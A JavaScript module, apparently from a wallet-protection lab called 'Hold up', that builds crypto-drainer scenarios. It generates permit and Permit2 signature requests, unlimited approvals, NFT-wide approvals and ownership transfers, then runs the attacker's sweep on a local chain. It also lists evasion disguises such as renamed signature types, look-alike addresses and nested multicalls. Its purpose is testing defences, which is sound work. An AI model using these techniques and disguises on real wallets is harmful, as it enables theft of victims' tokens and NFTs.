// Hold up Lab - techniques and disguises. One data-driven "recipe" { technique, params, disguises } compiles into:
//   - the exact request the wallet or the page would send (per entry door),
//   - the steps of the counterfactual: what the victim does, then what the attacker does with it.
// Catalogue scenarios and attacks built by a juror go through the same code.
import { ethers, ABI, MAX_UINT, MAX_UINT160, lc, hexQ, isAddr, ethCall, sendAs, sendRaw, signAsVictim } from './chain.mjs';

export class LabError extends Error {
  constructor(message, status = 400) { super(message); this.status = status; }
}

// ------------------------------------------------------------------ catalogue of building blocks (served by /api/attack/options)
export const TECHNIQUES = {
  permit: { kind: 'typed', attack: true, label: 'Signature hors chaîne « permit » (EIP-2612)', needs: 'permitToken', grants: 'erc20' },
  permit2: { kind: 'typed', attack: true, label: 'Signature hors chaîne de type Permit2', needs: 'permit2', grants: 'erc20' },
  approve: { kind: 'tx', attack: true, label: 'Autorisation de dépense (approve)', grants: 'erc20' },
  increase_allowance: { kind: 'tx', attack: true, label: 'Augmentation d’autorisation (increaseAllowance)', grants: 'erc20' },
  set_approval_for_all: { kind: 'tx', attack: true, label: 'Autorisation sur tous les NFT (setApprovalForAll)', grants: 'nft' },
  transfer: { kind: 'tx', attack: true, label: 'Envoi direct vers l’attaquant' },
  transfer_ownership: { kind: 'tx', attack: true, label: 'Changement de propriétaire d’un contrat (transferOwnership)', grants: 'control' },
  swap_no_min: { kind: 'tx', attack: true, label: 'Échange sans minimum reçu, par un routeur inconnu' },
  // honest operations (catalogue only)
  swap_demo: { kind: 'tx', label: 'Échange sur le routeur de démo, avec un minimum reçu' },
  mint_nft: { kind: 'tx', label: 'Création d’un NFT (mint)' },
  wrap: { kind: 'tx', label: 'Conversion AVAX vers WAVAX' },
  revoke: { kind: 'tx', label: 'Retrait d’une autorisation' },
  nft_revoke: { kind: 'tx', label: 'Retrait d’une autorisation NFT' },
  siwe: { kind: 'personal', label: 'Connexion par signature (Sign-In with Ethereum)' },
};
export const GOALS = {
  take_erc20: { label: 'Prendre un solde de jetons', techniques: ['permit', 'permit2', 'approve', 'increase_allowance', 'swap_no_min'] },
  take_nfts: { label: 'Prendre tous les NFT', techniques: ['set_approval_for_all'] },
  take_control: { label: 'Prendre le contrôle d’un contrat de la victime', techniques: ['transfer_ownership'] },
  get_sent_funds: { label: 'Obtenir que la victime envoie des fonds', techniques: ['transfer'] },
};
const TX_TECH = ['approve', 'increase_allowance', 'set_approval_for_all', 'transfer', 'transfer_ownership', 'swap_no_min'];
const RIGHTS = ['permit', 'permit2', 'approve', 'increase_allowance'];
export const DISGUISES = {
  batch_1: { label: 'Glissé dans un lot avec une opération anodine (wallet_sendCalls)', for: TX_TECH, group: 'batch', doors: ['site'] },
  batch_2: { label: 'Enveloppé dans un multicall (profondeur 2)', for: TX_TECH, group: 'batch', needs: 'multicall3' },
  batch_3: { label: 'Multicall dans un multicall (profondeur 3)', for: TX_TECH, group: 'batch', needs: 'multicall3' },
  rename_primary_type: { label: 'Type du message signé renommé (« Verification » au lieu de « Permit »)', for: ['permit', 'permit2'], group: 'type' },
  amount_below_max: { label: 'Montant juste sous le maximum', for: RIGHTS, group: 'amount' },
  amount_balance: { label: 'Montant égal à tout ce que la victime possède', for: [...RIGHTS, 'transfer', 'swap_no_min'], group: 'amount' },
  deadline_near: { label: 'Échéance proche (une heure)', for: ['permit', 'permit2'], group: 'deadline' },
  deadline_far: { label: 'Échéance lointaine (jamais)', for: ['permit', 'permit2'], group: 'deadline' },
  spender_eoa: { label: 'Bénéficiaire = simple compte de l’attaquant', for: [...RIGHTS, 'set_approval_for_all', 'transfer_ownership'], group: 'spender' },
  spender_lookalike_protocol: { label: 'Bénéficiaire = sosie de l’adresse d’un protocole connu', for: [...RIGHTS, 'set_approval_for_all', 'transfer_ownership'], group: 'spender' },
  recipient_lookalike_contact: { label: 'Destinataire = sosie d’un contact', for: ['transfer', 'swap_no_min'], group: 'recipient' },
  split_3: { label: 'Découpé en trois envois plus petits', for: ['transfer'], group: 'batch', doors: ['site'] },
  personal_sign_calldata: { label: 'Présenté comme un message à signer (octets en forme d’appel)', for: TX_TECH, group: 'batch', doors: ['site', 'walletconnect'] },
};
export const DOORS = ['site', 'wallet', 'walletconnect', 'exchange'];
export const INTENT_KINDS = ['pay_someone', 'send_to_my_account', 'buy_or_swap', 'connect_or_accept_offer', 'asked_by_someone', 'other'];
const ALIASES = ['drainer', 'attacker_eoa', 'collector', 'lookalike_router', 'lookalike_contact', 'never_seen', 'safe_vault', 'merchant', 'contact', 'own', 'router', 'shady', 'permit2', 'victim'];

// ------------------------------------------------------------------ parameter resolution
export function resolveAddress(ctx, v, what = 'adresse') {
  const a = ctx.accounts, c = ctx.c;
  const map = { drainer: c.drainer, attacker_eoa: a.attackerEoa, collector: a.collector, lookalike_router: ctx.lookalikes.router, lookalike_contact: ctx.lookalikes.contact,
    never_seen: ctx.neverSeen, safe_vault: ctx.safeVault, merchant: ctx.merchant, contact: a.contact, own: a.own2, router: c.router, shady: c.shady, permit2: c.permit2, victim: a.victim };
  if (typeof v === 'string' && map[v]) return ethers.getAddress(map[v]);
  if (isAddr(v)) return ethers.getAddress(lc(v));
  throw new LabError(`Paramètre « ${what} » invalide : donne une adresse 0x de 40 caractères ou l'un de ces noms : ${ALIASES.join(', ')}.`);
}
function tokenOf(ctx, key) {
  if (key === 'avax') return { native: true, symbol: 'AVAX', decimals: 18 };
  const t = ctx.tokens[key];
  if (!t) throw new LabError(`Jeton « ${key} » indisponible sur cette chaîne du lab (disponibles : avax, ${Object.keys(ctx.tokens).join(', ')}).`);
  return t;
}
async function balanceOf(ctx, token, who) {
  return token.native ? BigInt(await ctx.rpc('eth_getBalance', [who, 'latest'])) : ethCall(ctx.rpc, token.address, ABI.erc20, 'balanceOf', [who]);
}
async function amountOf(ctx, token, v, holder, cap = MAX_UINT) {
  if (v === 'max') return cap;
  if (v === 'max_minus_1') return cap - 1n;
  if (v === 'balance') { const b = await balanceOf(ctx, token, holder); return token.native ? b - 10n ** 17n : b; } // native: keep a little for gas
  if (v === 'most') return ((await balanceOf(ctx, token, holder)) * 9n) / 10n;
  if (typeof v === 'number') v = String(v);
  if (typeof v !== 'string' || !/^\d{1,30}(\.\d{1,18})?$/.test(v)) throw new LabError('Paramètre « amount » invalide : un nombre décimal (ex. 250.5) ou max, max_minus_1, balance, most.');
  try { return ethers.parseUnits(v, token.decimals); } catch { throw new LabError('Paramètre « amount » invalide : trop de décimales pour ce jeton.'); }
}
async function deadlineOf(ctx, v, cap = MAX_UINT) {
  if (v === undefined || v === 'far') return cap;
  const now = Number(BigInt((await ctx.rpc('eth_getBlockByNumber', ['latest', false])).timestamp));
  if (v === 'near') return BigInt(now + 3600);
  if (v === 'past') return BigInt(now - 3600);
  const n = Number(v);
  if (!Number.isFinite(n) || n < 0 || n > 10 * 365 * 86400) throw new LabError('Paramètre « deadline » invalide : far, near, past, ou un nombre de secondes à partir de maintenant.');
  return BigInt(now + Math.round(n));
}

const call = (to, iface, fn, args, value = 0n) => ({ to, data: iface.encodeFunctionData(fn, args), value });
const txResult = (who, what, r) => ({ who, what, hash: r.hash, reverted: !!r.reverted, ...(r.error ? { error: r.error } : {}), gas: r.gasUsed !== undefined ? r.gasUsed * r.gasPrice : 0n });
const min = (a, b) => (a < b ? a : b);

// ------------------------------------------------------------------ attacker follow-ups (what the right is used for)
// The attacker acts with its own account when it has one; an address without a known key (the look-alike) is impersonated on the
// local node: the stand-in for "the attacker generated this address, so it holds its key".
async function pullErc20(ctx, token, spender) {
  const { rpc, c, accounts: a } = ctx;
  if (lc(spender) === lc(c.drainer)) return [txResult('attaquant', 'vide le solde avec le droit obtenu (FreshDrainer.sweepERC20)', await sendAs(rpc, a.collector, call(c.drainer, ABI.drainer, 'sweepERC20', [token.address, a.victim])))];
  const [allow, bal] = await Promise.all([ethCall(rpc, token.address, ABI.erc20, 'allowance', [a.victim, spender]), balanceOf(ctx, token, a.victim)]);
  const take = min(allow, bal);
  return [txResult('attaquant', 'prend les jetons avec le droit obtenu (transferFrom)', await sendAs(rpc, spender, call(token.address, ABI.erc20, 'transferFrom', [a.victim, a.collector, take])))];
}

// ------------------------------------------------------------------ techniques -> action
// action = { kind: 'tx' | 'typed' | 'personal', calls? | typedData? | message?, setup: [calls the victim made earlier], follow: async (env) => [tx results],
//            spender?, recipient?, summary }
async function technique(ctx, t, p) {
  const { rpc, c, accounts: a } = ctx;
  const V = a.victim;
  switch (t) {
    case 'permit': {
      const token = tokenOf(ctx, p.token || 'dusdc');
      if (!token.permitName) throw new LabError(`Le jeton ${token.symbol} n'a pas de « permit » (EIP-2612) sur cette chaîne.`);
      const spender = resolveAddress(ctx, p.spender || 'drainer', 'spender');
      const value = await amountOf(ctx, token, p.amount ?? 'max', V);
      const deadline = await deadlineOf(ctx, p.deadline);
      const nonce = await ethCall(rpc, token.address, ABI.erc20, 'nonces', [V]);
      const typeName = p.primaryType || 'Permit';
      const typedData = {
        types: { EIP712Domain: [{ name: 'name', type: 'string' }, { name: 'version', type: 'string' }, { name: 'chainId', type: 'uint256' }, { name: 'verifyingContract', type: 'address' }],
          [typeName]: [{ name: 'owner', type: 'address' }, { name: 'spender', type: 'address' }, { name: 'value', type: 'uint256' }, { name: 'nonce', type: 'uint256' }, { name: 'deadline', type: 'uint256' }] },
        primaryType: typeName,
        domain: { name: token.permitName, version: token.permitVersion, chainId: ctx.chainId, verifyingContract: token.address },
        message: { owner: V, spender, value: value.toString(), nonce: nonce.toString(), deadline: deadline.toString() },
      };
      const follow = async (env) => {
        const s = ethers.Signature.from(env.signature);
        if (lc(spender) === lc(c.drainer)) return [txResult('attaquant', 'présente la signature et vide le solde (FreshDrainer.drainWithPermit)', await sendAs(rpc, a.collector, call(c.drainer, ABI.drainer, 'drainWithPermit', [token.address, V, value, deadline, s.v, s.r, s.s])))];
        const r1 = txResult('attaquant', 'présente la signature au jeton (permit)', await sendAs(rpc, spender, call(token.address, ABI.erc20, 'permit', [V, spender, value, deadline, s.v, s.r, s.s])));
        return [r1, ...(await pullErc20(ctx, token, spender))];
      };
      return { kind: 'typed', typedData, setup: [], follow, spender, token };
    }
    case 'permit2': {
      if (!c.permit2) throw new LabError("Permit2 n'existe pas sur cette chaîne du lab (mode hors ligne) : technique indisponible.");
      const token = tokenOf(ctx, p.token || 'dusdc');
      if (token.native) throw new LabError('Permit2 ne porte que sur des jetons.');
      const spender = resolveAddress(ctx, p.spender || 'attacker_eoa', 'spender');
      const amount = await amountOf(ctx, token, p.amount ?? 'max', V, MAX_UINT160);
      if (amount > MAX_UINT160) throw new LabError('Montant trop grand pour Permit2.');
      const cap48 = 2n ** 48n - 1n;
      const expiration = await deadlineOf(ctx, p.deadline, cap48);
      const setup = [{ what: 'a autorisé Permit2 sur ce jeton, comme le font les applications qui l’utilisent', ...call(token.address, ABI.erc20, 'approve', [c.permit2, MAX_UINT]) }];
      const typeName = p.primaryType || 'PermitSingle';
      const lazy = async () => {
        const [, , nonce] = await ethCall(rpc, c.permit2, ABI.permit2, 'allowance', [V, token.address, spender]);
        return {
          types: { EIP712Domain: [{ name: 'name', type: 'string' }, { name: 'chainId', type: 'uint256' }, { name: 'verifyingContract', type: 'address' }],
            [typeName]: [{ name: 'details', type: 'PermitDetails' }, { name: 'spender', type: 'address' }, { name: 'sigDeadline', type: 'uint256' }],
            PermitDetails: [{ name: 'token', type: 'address' }, { name: 'amount', type: 'uint160' }, { name: 'expiration', type: 'uint48' }, { name: 'nonce', type: 'uint48' }] },
          primaryType: typeName,
          domain: { name: 'Permit2', chainId: ctx.chainId, verifyingContract: c.permit2 },
          message: { details: { token: token.address, amount: amount.toString(), expiration: expiration.toString(), nonce: nonce.toString() }, spender, sigDeadline: (expiration === cap48 ? MAX_UINT : expiration).toString() },
        };
      };
      const follow = async (env) => {
        const m = env.typedData.message;
        const single = [[m.details.token, m.details.amount, m.details.expiration, m.details.nonce], m.spender, m.sigDeadline];
        const r1 = txResult('attaquant', 'présente la signature à Permit2 (permit)', await sendAs(rpc, spender, call(c.permit2, ABI.permit2, 'permit', [V, single, env.signature])));
        const take = min(amount, await balanceOf(ctx, token, V));
        const r2 = txResult('attaquant', 'prend les jetons par Permit2 (transferFrom)', await sendAs(rpc, spender, call(c.permit2, ABI.permit2, 'transferFrom', [V, a.collector, take, token.address])));
        return [r1, r2];
      };
      return { kind: 'typed', typedData: lazy, setup, follow, spender, token };
    }
    case 'approve': case 'increase_allowance': {
      // DemoUSDC (OpenZeppelin 5) has no increaseAllowance: on the fork the default is the real USDC contract, which has it
      const token = tokenOf(ctx, p.token || (t === 'increase_allowance' && ctx.tokens.usdc ? 'usdc' : 'dusdc'));
      if (token.native) throw new LabError('Une autorisation de dépense ne porte que sur un jeton.');
      const spender = resolveAddress(ctx, p.spender || 'drainer', 'spender');
      const amount = await amountOf(ctx, token, p.amount ?? 'max', V);
      return { kind: 'tx', calls: [call(token.address, ABI.erc20, t === 'approve' ? 'approve' : 'increaseAllowance', [spender, amount])], setup: [], follow: () => pullErc20(ctx, token, spender), spender, token };
    }
    case 'set_approval_for_all': {
      const spender = resolveAddress(ctx, p.spender || 'drainer', 'spender');
      const follow = async () => {
        if (lc(spender) === lc(c.drainer)) return [txResult('attaquant', 'prend tous les NFT (FreshDrainer.sweepNFTBatch)', await sendAs(rpc, a.collector, call(c.drainer, ABI.drainer, 'sweepNFTBatch', [c.nft, V, ctx.nftIds])))];
        const out = [];
        for (const id of ctx.nftIds) out.push(txResult('attaquant', `prend le NFT n° ${id} (transferFrom)`, await sendAs(rpc, spender, call(c.nft, ABI.nft, 'transferFrom', [V, a.collector, id]))));
        return out;
      };
      return { kind: 'tx', calls: [call(c.nft, ABI.nft, 'setApprovalForAll', [spender, true])], setup: [], follow, spender };
    }
    case 'transfer': {
      const token = tokenOf(ctx, p.token || 'dusdc');
      const recipient = resolveAddress(ctx, p.recipient || 'never_seen', 'recipient');
      const amount = await amountOf(ctx, token, p.amount ?? '500', p.holder || V);
      const one = (amt) => (token.native ? { to: recipient, data: '0x', value: amt } : call(token.address, ABI.erc20, 'transfer', [recipient, amt]));
      return { kind: 'tx', calls: [one(amount)], setup: [], follow: null, recipient, token, amount, one };
    }
    case 'transfer_ownership': {
      const spender = resolveAddress(ctx, p.spender || 'attacker_eoa', 'spender');
      const follow = async () => {
        const bal = await ethCall(rpc, c.usdc, ABI.erc20, 'balanceOf', [c.vault]);
        return [txResult('attaquant', 'devenu propriétaire, vide le coffre (withdraw)', await sendAs(rpc, spender, call(c.vault, ABI.vault, 'withdraw', [c.usdc, a.collector, bal])))];
      };
      return { kind: 'tx', calls: [call(c.vault, ABI.vault, 'transferOwnership', [spender])], setup: [], follow, spender };
    }
    case 'swap_no_min': {
      const token = ctx.tokens.dusdc;
      const amountIn = await amountOf(ctx, token, p.amount ?? '1000', V);
      const to = resolveAddress(ctx, p.recipient || 'victim', 'recipient');
      const minOut = p.minOut === undefined || p.minOut === 'none' ? 0n : await amountOf(ctx, ctx.tokens.dwavax, p.minOut, V);
      const setup = [{ what: 'a autorisé ce routeur pour le montant de l’échange (étape précédente du même site)', ...call(token.address, ABI.erc20, 'approve', [c.shady, amountIn]) }];
      return { kind: 'tx', calls: [call(c.shady, ABI.shady, 'swapExactTokensForTokens', [amountIn, minOut, [token.address, c.dwavax], to, MAX_UINT])], setup, follow: null, spender: c.shady, recipient: to, token };
    }
    // ---- honest operations
    case 'swap_demo': {
      const token = ctx.tokens.dusdc;
      const amountIn = await amountOf(ctx, token, p.amount ?? '200', V);
      const fair = (amountIn * 10n ** 12n) / 100n;
      const setup = [{ what: 'a autorisé le routeur de démo pour le montant exact de l’échange', ...call(token.address, ABI.erc20, 'approve', [c.router, amountIn]) }];
      return { kind: 'tx', calls: [call(c.router, ABI.router, 'swapUSDCforWAVAX', [amountIn, (fair * 99n) / 100n])], setup, follow: null, token };
    }
    case 'mint_nft': return { kind: 'tx', calls: [call(c.nft, ABI.nft, 'mint', [V])], setup: [], follow: null };
    case 'wrap': {
      const amount = await amountOf(ctx, tokenOf(ctx, 'avax'), p.amount ?? '2', V);
      return { kind: 'tx', calls: [call(c.wavax, ABI.erc20, 'deposit', [], amount)], setup: [], follow: null };
    }
    case 'revoke': {
      const token = tokenOf(ctx, p.token || 'dusdc');
      const spender = resolveAddress(ctx, p.spender || 'shady', 'spender');
      const setup = [{ what: 'avait autorisé ce contrat auparavant', ...call(token.address, ABI.erc20, 'approve', [spender, 500n * 10n ** BigInt(token.decimals)]) }];
      return { kind: 'tx', calls: [call(token.address, ABI.erc20, 'approve', [spender, 0n])], setup, follow: null, token };
    }
    case 'nft_revoke': {
      const spender = resolveAddress(ctx, p.spender || 'shady', 'spender');
      const setup = [{ what: 'avait autorisé ce contrat sur ses NFT auparavant', ...call(c.nft, ABI.nft, 'setApprovalForAll', [spender, true]) }];
      return { kind: 'tx', calls: [call(c.nft, ABI.nft, 'setApprovalForAll', [spender, false])], setup, follow: null };
    }
    case 'siwe': {
      const host = p.host || 'app.example';
      const block = await rpc('eth_getBlockByNumber', ['latest', false]);
      const issued = new Date(Number(BigInt(block.timestamp)) * 1000).toISOString();
      // EIP-4361 message, standard template (not a scam text)
      const message = `${host} wants you to sign in with your Ethereum account:\n${V}\n\nSign in to ${host}\n\nURI: https://${host}\nVersion: 1\nChain ID: ${ctx.chainId}\nNonce: ${ethers.keccak256(ethers.toUtf8Bytes(host + block.hash)).slice(2, 18)}\nIssued At: ${issued}`;
      return { kind: 'personal', message, setup: [], follow: null };
    }
    default: throw new LabError(`Technique inconnue : ${String(t).slice(0, 40)}.`);
  }
}

// ------------------------------------------------------------------ disguises
function wrapMulticall(ctx, c1) {
  if (!ctx.c.multicall3) throw new LabError("Multicall3 n'existe pas sur cette chaîne du lab (mode hors ligne) : déguisement indisponible.");
  return call(ctx.c.multicall3, ABI.multicall3, 'aggregate3Value', [[[c1.to, false, c1.value || 0n, c1.data]]], c1.value || 0n);
}
function applyDisguises(ctx, act, list, techId) {
  let mode = act.kind === 'tx' ? (act.calls.length > 1 ? 'calls' : 'tx') : act.kind;
  for (const d of list) {
    const def = DISGUISES[d];
    if (!def) throw new LabError(`Déguisement inconnu : ${String(d).slice(0, 40)}.`);
    if (!def.for.includes(techId)) throw new LabError(`Le déguisement « ${d} » ne se combine pas avec la technique « ${techId} ».`);
    if (d === 'batch_1') { act.calls = [call(ctx.c.nft, ABI.nft, 'mint', [ctx.accounts.victim]), ...act.calls]; mode = 'calls'; }
    else if (d === 'batch_2') act.calls = act.calls.map((x) => wrapMulticall(ctx, x));
    else if (d === 'batch_3') act.calls = act.calls.map((x) => wrapMulticall(ctx, wrapMulticall(ctx, x)));
    else if (d === 'split_3') {
      const part = act.amount / 3n;
      act.calls = [act.one(part), act.one(part), act.one(act.amount - 2n * part)]; mode = 'calls';
    } else if (d === 'personal_sign_calldata') { act.message = act.calls[0].data === '0x' ? ethers.hexlify(ethers.concat([act.calls[0].to, ethers.toBeHex(act.calls[0].value, 32)])) : act.calls[0].data; mode = 'personal'; act.signatureOnly = true; }
  }
  return mode;
}
// disguises that are only a parameter choice
function disguiseParams(list, p) {
  const out = { ...p };
  for (const d of list) {
    if (d === 'amount_below_max') out.amount = 'max_minus_1';
    else if (d === 'amount_balance') out.amount = 'balance';
    else if (d === 'deadline_near') out.deadline = 'near';
    else if (d === 'deadline_far') out.deadline = 'far';
    else if (d === 'spender_eoa') out.spender = 'attacker_eoa';
    else if (d === 'spender_lookalike_protocol') out.spender = 'lookalike_router';
    else if (d === 'recipient_lookalike_contact') out.recipient = 'lookalike_contact';
    else if (d === 'rename_primary_type') out.primaryType = 'Verification';
  }
  return out;
}

// ------------------------------------------------------------------ compile: recipe + door -> request + counterfactual steps
// Runs INSIDE the run's snapshot: the earlier steps of the victim (setup) are really executed first.
export async function compile(ctx, sc, overrides = {}) {
  const recipe = sc.recipe || {};
  const tdef = TECHNIQUES[recipe.technique];
  if (!tdef) throw new LabError(`Technique inconnue : ${String(recipe.technique).slice(0, 40)}.`);
  const door = sc.door;
  if (!DOORS.includes(door)) throw new LabError(`Porte d'entrée inconnue : ${String(door).slice(0, 40)}.`);
  const disguises = Array.isArray(recipe.disguises) ? recipe.disguises : [];
  const groups = new Set();
  for (const d of disguises) { const g = DISGUISES[d] && DISGUISES[d].group; if (g && groups.has(g)) throw new LabError(`Deux déguisements du même groupe (« ${g} ») ne se combinent pas.`); groups.add(g); }
  const p = disguiseParams(disguises, { ...(recipe.params || {}), ...overrides });
  const V = ctx.accounts.victim;
  const exchange = door === 'exchange';
  if (exchange && recipe.technique !== 'transfer') throw new LabError("Depuis une plateforme d'échange, la seule opération possible est un retrait (envoi direct).");
  if (exchange && disguises.some((d) => DISGUISES[d].group === 'batch')) throw new LabError("Un retrait de plateforme ne peut pas être enveloppé dans un lot.");
  if (exchange) p.holder = ctx.accounts.exchange;

  const act = await technique(ctx, recipe.technique, p);
  const steps = [];
  // earlier steps of the victim (really executed, shown as "avant")
  const setupTxs = [];
  for (const s of act.setup) {
    const r = await sendRaw(ctx.rpc, await signAsVictim(ctx, s));
    if (r.reverted) throw new LabError(`Étape préalable impossible sur la chaîne du lab : ${r.error}`, 500);
    setupTxs.push({ who: 'victime', what: s.what, hash: r.hash, before: true });
  }
  if (typeof act.typedData === 'function') act.typedData = await act.typedData();
  let mode = applyDisguises(ctx, act, disguises, recipe.technique);
  for (const d of disguises) if (DISGUISES[d].doors && !DISGUISES[d].doors.includes(door)) throw new LabError(`Le déguisement « ${d} » n'existe pas par la porte « ${door} ».`);

  const chainHex = hexQ(ctx.chainId);
  const siteTx = (x) => ({ from: V, to: x.to, data: x.data, value: hexQ(x.value || 0), chainId: chainHex });
  let request, path = 'extension', covered = true, coverageNote, checked = null, raw = null;
  const sigRequest = () => (mode === 'typed' ? { method: 'eth_signTypedData_v4', params: [V, JSON.stringify(act.typedData)] } : { method: 'personal_sign', params: [/^0x/.test(act.message) ? act.message : ethers.hexlify(ethers.toUtf8Bytes(act.message)), V] });

  if (exchange) {
    path = 'paste';
    request = { kind: 'exchange_withdraw', platform: (sc.staging && sc.staging.brand) || 'Plateforme', asset: act.token.symbol, amount: ethers.formatUnits(act.amount, act.token.decimals), address: act.recipient };
    checked = { method: 'eth_sendTransaction', params: [siteTx(act.calls[0])] };
    coverageNote = "Le retrait part de la plateforme, pas du portefeuille : Hold up ne peut ni le voir ni le retenir. Seule vérification possible : l'adresse et le message collés par la personne, avant de valider.";
  } else if (door === 'site') {
    if (mode === 'tx') request = { method: 'eth_sendTransaction', params: [siteTx(act.calls[0])] };
    else if (mode === 'calls') request = { method: 'wallet_sendCalls', params: [{ version: '1.0', from: V, chainId: chainHex, calls: act.calls.map((x) => ({ to: x.to, data: x.data, value: hexQ(x.value || 0) })) }] };
    else request = sigRequest();
  } else { // wallet, walletconnect
    if (mode === 'calls') throw new LabError("Par cette porte, le portefeuille envoie une seule opération signée à la fois : pas de lot.");
    if (mode === 'tx') { raw = await signAsVictim(ctx, act.calls[0]); request = { method: 'eth_sendRawTransaction', params: [raw] }; path = 'rpc'; }
    else if (door === 'wallet') throw new LabError("L'écran « Envoyer » d'un portefeuille n'émet pas de signature de message : choisis la porte site ou walletconnect.");
    else {
      request = sigRequest(); path = 'none'; covered = false;
      coverageNote = "Par WalletConnect, une signature hors chaîne passe par le relais WalletConnect, pas par le RPC du portefeuille : le RPC protecteur ne la voit jamais.";
    }
  }

  // ---- counterfactual
  const victimSteps = async (env) => {
    const out = [];
    if (exchange) { out.push(txResult('plateforme', 'exécute le retrait demandé', await sendAs(ctx.rpc, ctx.accounts.exchange, act.calls[0]))); return out; }
    if (mode === 'typed') {
      const types = { ...act.typedData.types }; delete types.EIP712Domain;
      env.typedData = act.typedData;
      env.signature = await ctx.victimWallet.signTypedData(act.typedData.domain, types, act.typedData.message);
      out.push({ who: 'victime', what: 'signe le message (rien ne part sur la chaîne à cet instant)', hash: null, reverted: false, gas: 0n });
    } else if (mode === 'personal') {
      env.signature = await ctx.victimWallet.signMessage(/^0x/.test(act.message) ? ethers.getBytes(act.message) : act.message);
      out.push({ who: 'victime', what: 'signe le message (rien ne part sur la chaîne à cet instant)', hash: null, reverted: false, gas: 0n });
    } else if (raw) out.push(txResult('victime', 'envoie la transaction signée', await sendRaw(ctx.rpc, raw)));
    else for (const x of act.calls) out.push(txResult('victime', act.calls.length > 1 ? 'envoie une opération du lot' : 'envoie la transaction', await sendRaw(ctx.rpc, await signAsVictim(ctx, x))));
    return out;
  };
  const exploit = sc.label === 'malveillant' && act.follow && !act.signatureOnly ? act.follow : null;
  const attackers = [];
  if (sc.label === 'malveillant') for (const x of [act.spender, act.recipient]) if (x && lc(x) !== lc(V)) attackers.push(lc(x));
  const watch = [act.spender, act.recipient].filter(Boolean).map(lc);
  return {
    request, path, covered, coverageNote, checked, raw, setupTxs, victimSteps, exploit, attackers, watch,
    signatureOnly: !!act.signatureOnly || (mode === 'personal'), mode,
    resolved: { ...(act.spender ? { spender: act.spender } : {}), ...(act.recipient ? { recipient: act.recipient } : {}), ...(act.token ? { token: act.token.symbol } : {}) },
  };
}
